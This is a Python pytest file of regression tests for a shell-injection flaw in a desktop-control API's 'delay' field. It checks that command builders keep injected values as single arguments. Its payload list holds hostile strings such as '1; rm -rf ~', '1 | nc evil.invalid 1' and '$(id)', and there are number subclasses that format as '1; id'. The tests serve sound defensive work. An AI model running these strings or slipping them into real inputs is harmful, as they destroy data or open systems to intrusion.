"""No value from a request body reaches a shell as syntax (#272).

corgea found `delay` on `POST /v1/desktop/type` interpolated into a
command string with no quoting:

    cmd = f'ydotool type --key-delay {delay} {escaped_text}'

`text` next to it was already `shlex.quote`d, so the defect was not that
quoting was unknown here -- it was that a field nobody thought of as a
string was left out. `{"delay": "1; touch /tmp/pwned"}` ran the touch.

So these tests are written against the *class*, not the one field: every
numeric field of the desktop builders is fed the same catalogue of shell
metacharacters, and the built command is checked for unquoted syntax.
A new interpolation added later fails here without anyone remembering
this issue.
"""
from __future__ import annotations

import asyncio
import shlex

import pytest

from arena.desktop.input import build_type_command
from arena.desktop.window_action import _wmctrl_command, _xdotool_command
from arena.handler_errors import BodyFieldError
from arena.handler_params import body_float

# Payloads that turn an unquoted interpolation into a second command.
SHELL_PAYLOADS = [
    "1; touch /tmp/pwned",
    "1 && id",
    "1 || id",
    "1 | nc evil.invalid 1",
    "$(id)",
    "`id`",
    "1\nid",
    "1 > /tmp/clobbered",
    "1 & id",
    "1; rm -rf ~",
]

# Characters that must never appear outside single quotes in a built command.
SHELL_METACHARACTERS = ";&|`$\n><"


BENIGN_ID = "0x03000007"
BENIGN_DELAY = 50


def _assert_no_injection(command: str, payload: str, baseline: str) -> None:
    """The payload must occupy exactly one argument, and add no others.

    Checking the argument *vector* rather than the raw string is what
    makes this reliable. Two earlier attempts were not:

    * banning metacharacters outright flagged the `2>/dev/null` and `&&`
      that these commands legitimately contain;
    * diffing quote-stripped skeletons flagged the benign baseline,
      because `shlex.quote` leaves a safe id unquoted, so the two
      skeletons differed by the id text itself.

    `shlex.split` answers the real question: after the shell finishes
    parsing, is the payload one argument, or did it become new words and
    operators? The vector must match the benign one position for
    position, differing only where the value goes.
    """
    built = shlex.split(command)
    expected = shlex.split(baseline)

    assert len(built) == len(expected), (
        f"payload {payload!r} changed the argument count "
        f"({len(expected)} -> {len(built)}).\n"
        f"  built:    {command!r}\n"
        f"  baseline: {baseline!r}"
    )
    for got, want in zip(built, expected):
        if got != want:
            assert payload in got, (
                f"payload {payload!r} produced an unexpected argument "
                f"{got!r} (baseline had {want!r})"
            )


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("env", [{"has_ydotool": True}, {"has_xdotool": True}])
def test_type_delay_cannot_inject_a_shell_command(env, payload):
    """The exact defect: `delay` is not a place to put shell syntax."""
    command, _tool, _err = build_type_command(env=env, text="hello", delay=payload)
    baseline, _t, _e = build_type_command(env=env, text="hello", delay=BENIGN_DELAY)

    assert command is not None
    _assert_no_injection(command, payload, baseline)
    assert "touch" not in command
    assert "rm -rf" not in command


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
def test_type_text_cannot_inject_a_shell_command(payload):
    """`text` was already quoted; this pins it so it stays that way."""
    command, _tool, _err = build_type_command(
        env={"has_ydotool": True}, text=payload, delay=50
    )
    baseline, _t, _e = build_type_command(
        env={"has_ydotool": True}, text="hello", delay=50
    )

    assert command is not None
    _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("action", ["minimize", "restore", "maximize", "close"])
def test_window_id_cannot_inject_through_either_backend(action, payload):
    """`_xdotool_command` quoted its window id and `_wmctrl_command` did not.

    Window ids come from a listing rather than the body today, so this is
    hardening, not a live hole -- but it is the same shape as `delay`,
    whose callers also used to pass only safe values.
    """
    for builder in (_wmctrl_command, _xdotool_command):
        command = builder(action, payload, None, display_env="DISPLAY=:0")
        baseline = builder(action, BENIGN_ID, None, display_env="DISPLAY=:0")
        assert command is not None
        _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("field", ["x", "y", "width", "height"])
def test_window_geometry_cannot_inject(field, payload):
    """Geometry reaches the command through `int()` in the builder.

    A non-numeric value must not become shell syntax. Raising is an
    acceptable outcome here (the handler answers 400); emitting a command
    containing the payload is not.
    """
    kwargs = {"x": 0, "y": 0, "width": 100, "height": 100}
    kwargs[field] = payload
    for builder in (_wmctrl_command, _xdotool_command):
        try:
            command = builder(
                "move_resize", "0x1", {"geometry": {}},
                display_env="DISPLAY=:0", **kwargs,
            )
        except (TypeError, ValueError):
            continue  # refused outright, which is safe
        baseline = builder(
            "move_resize", "0x1", {"geometry": {}},
            display_env="DISPLAY=:0", x=0, y=0, width=100, height=100,
        )
        assert command is not None
        _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize(
    ("delay", "expected"),
    [
        (50, "50"),        # the default
        (0, "0"),          # no delay is a real request
        (12.5, "12.5"),    # a float is a valid keystroke delay
        ("75", "75"),      # numeric strings are what HTTP clients send
        (10_000, "10000"),  # the documented ceiling
    ],
)
def test_legitimate_delays_are_unchanged(delay, expected):
    """The fix must not narrow what already worked."""
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    assert f"--delay {expected} " in command


@pytest.mark.parametrize("delay", [10_001, 10**12, -1, -10**9])
def test_out_of_range_delays_are_clamped_not_interpolated(delay):
    """An absurd delay is a hung desktop, so the builder bounds it."""
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    emitted = command.split("--delay ")[1].split(" ")[0]
    assert 0 <= float(emitted) <= 10_000


def test_a_real_window_id_survives_quoting():
    """Quoting must not break the ids that actually occur."""
    command = _wmctrl_command("close", "0x03000007", None, display_env="DISPLAY=:0")

    assert "0x03000007" in command
    assert shlex.split(command)[-2] == "0x03000007"


@pytest.mark.parametrize("delay", [float("nan"), float("inf"), float("-inf")])
def test_non_finite_delays_fall_back_to_the_default(delay):
    """NaN and the infinities are valid Python floats and nonsense here.

    `min`/`max` do not order NaN, so clamping alone would have passed it
    straight through into the command string.
    """
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    emitted = command.split("--delay ")[1].split(" ")[0]
    assert emitted == "50"


class _EvilInt(int):
    """An int subclass that lies when formatted.

    `__format__` is what an f-string calls, so overriding it puts shell
    syntax into a command even after a range check has passed on the
    numeric value. Found by cubic in review.
    """

    def __str__(self) -> str:
        return "1; id"

    def __repr__(self) -> str:
        return "1; id"

    def __format__(self, spec: str) -> str:
        return "1; id"


class _EvilFloat(float):
    def __format__(self, spec: str) -> str:
        return "1; id"


@pytest.mark.parametrize(
    ("evil", "plain"), [(_EvilInt(5), 5), (_EvilFloat(5.5), 5.5)]
)
def test_a_numeric_subclass_cannot_format_its_way_into_the_command(evil, plain):
    """Being a number is not enough; the builder must emit a plain one.

    The baseline uses the subclass's own numeric value, so the only
    difference under test is the type, not the number.
    """
    command, _tool, _err = build_type_command(
        env={"has_ydotool": True}, text="hi", delay=evil
    )
    baseline, _t, _e = build_type_command(
        env={"has_ydotool": True}, text="hi", delay=plain
    )

    assert "; id" not in command
    assert command == baseline
    _assert_no_injection(command, "subclass __format__", baseline)


@pytest.mark.parametrize("delay", [10**400, -(10**400)])
def test_an_integer_too_wide_for_a_float_is_clamped_not_a_crash(delay):
    """`math.isfinite` raises OverflowError on these rather than answering.

    The builder's contract is to return a command, so an absurd integer
    has to clamp like any other out-of-range value.
    """
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    emitted = command.split("--delay ")[1].split(" ")[0]
    assert 0 <= float(emitted) <= 10_000


@pytest.mark.parametrize("delay", [12.5, 0.5, 2.0, 50, "75", 0, 10_000])
def test_the_handler_accepts_the_delays_callers_already_send(delay):
    """A fractional delay is legitimate and must not become a 400.

    The first version of this fix used `body_int`, which refuses 12.5 --
    a compatibility regression riding along with a security fix, caught
    by aikido and cubic. `xdotool --delay` and the builder both accept
    fractions.
    """
    parsed = body_float({"delay": delay}, "delay", default=50.0)

    assert 0 <= parsed <= 10_000
    assert float(parsed) == float(delay)


@pytest.mark.parametrize(
    "delay",
    ["1; id", "abc", True, [], {}, float("nan"), float("inf")],
)
def test_the_handler_refuses_a_delay_that_is_not_a_finite_number(delay):
    """The 400 is the point: the caller is told which field was wrong."""
    with pytest.raises(BodyFieldError) as caught:
        body_float({"delay": delay}, "delay", default=50.0)

    assert "delay" in str(caught.value)


@pytest.mark.parametrize("missing", [{}, {"delay": None}, {"delay": ""}])
def test_an_unspecified_delay_keeps_the_default(missing):
    """Missing, null and "" mean unspecified, matching the other helpers.

    Refusing these would break every caller that omits the field.
    """
    assert body_float(missing, "delay", default=50.0) == 50.0


def _type_handler(monkeypatch, recorder):
    """Build the real /v1/desktop/type handler with the shell stubbed out."""
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
    import unified_bridge as ub
    from arena.desktop.input_handlers import make_desktop_input_handlers
    from arena.handler_context import DesktopHandlerContext

    async def fake_exec(cmd, timeout=None):
        recorder.append(cmd)
        return {"ok": True, "stdout": "", "stderr": "", "exit_code": 0}

    ctx = DesktopHandlerContext(
        require_auth=lambda *a, **k: None,
        record_request=lambda *a, **k: None,
        cors_json_response=ub._cors_json_response,
        control_check=lambda *a, **k: None,
        control_record_agent_action=lambda *a, **k: None,
        desktop_exec=fake_exec,
        detect_desktop_env=lambda: {"has_ydotool": True},
        get_active_window=ub._get_active_window,
        kwin_windows_via_script=ub._kwin_windows_via_script,
        capture_screenshot=ub.capture_desktop_screenshot,
        ocr_desktop=ub.ocr_desktop,
        kwin_focus_window=ub.kwin_focus_window_via_script,
        focus_window=ub.focus_window,
        audit=lambda *a, **k: None,
    )
    _click, type_handler, _key, _mouse = make_desktop_input_handlers(ctx)
    return type_handler


async def _post(handler, body):
    """Drive the handler with a JSON body and return (status, payload)."""
    import json as _json

    from aiohttp.test_utils import make_mocked_request

    payload = _json.dumps(body).encode()
    request = make_mocked_request(
        "POST", "/v1/desktop/type",
        headers={"Content-Type": "application/json"},
        payload=None,
    )

    async def read():
        return payload

    request.read = read
    response = await handler(request)
    return response.status, _json.loads(response.body.decode())


@pytest.mark.parametrize("delay", [12.5, 0.5, 2.0, 50, "75"])
def test_the_endpoint_itself_accepts_a_fractional_delay(monkeypatch, delay):
    """End-to-end through the handler, not just the parser.

    Asserting on `body_float` alone did not catch swapping the handler
    back to `body_int`: the mutation left every parser test passing.
    This drives the real handler, so the choice of parser is under test.
    """
    commands: list[str] = []
    handler = _type_handler(monkeypatch, commands)

    status, payload = asyncio.run(_post(handler, {"text": "hi", "delay": delay}))

    assert status == 200, payload
    # The handler may emit a keyboard-layout command first, so find the
    # typing one rather than assuming it is the only command.
    typed = [c for c in commands if "--key-delay" in c]
    assert typed, f"the handler never built a type command: {commands!r}"
    emitted = typed[0].split("--key-delay ")[1].split(" ")[0]
    assert float(emitted) == float(delay)


@pytest.mark.parametrize("delay", ["1; id", "abc", True, [], 20_000, -1])
def test_the_endpoint_refuses_a_bad_delay_with_400(monkeypatch, delay):
    """A refusal names the field and never reaches the shell."""
    commands: list[str] = []
    handler = _type_handler(monkeypatch, commands)

    status, payload = asyncio.run(_post(handler, {"text": "hi", "delay": delay}))

    assert status == 400, payload
    assert "delay" in str(payload).lower()
    typed = [c for c in commands if "--key-delay" in c]
    assert not typed, f"a refused request still built {typed!r}"


@pytest.mark.parametrize(
    ("raw", "json_type"),
    [("20000", "string"), (20_000, "number"), (20_000.5, "number")],
)
def test_an_out_of_range_delay_reports_the_json_type_it_was_sent_as(
    monkeypatch, raw, json_type
):
    """The 400 must describe the field as the caller wrote it.

    Handing the parsed float to `BodyFieldError` made `{"delay": "20000"}`
    report `received number`, contradicting the JSON-type contract that
    #259/#270 pinned everywhere else (cubic).
    """
    commands: list[str] = []
    handler = _type_handler(monkeypatch, commands)

    status, payload = asyncio.run(_post(handler, {"text": "hi", "delay": raw}))

    assert status == 400
    assert f"received {json_type}" in str(payload), payload


def test_a_sub_millisecond_delay_is_rounded_not_truncated():
    """`int()` turned a 0.6 ms delay into no delay at all.

    The Windows backend sleeps `delay_ms / 1000`, so a fraction cannot
    survive intact -- but rounding to the nearest millisecond keeps the
    caller's intent, where truncation discards it.
    """
    assert round(0.6) == 1
    assert int(0.6) == 0  # what the code used to do
    assert round(12.5) == 12  # banker's rounding, still within a ms
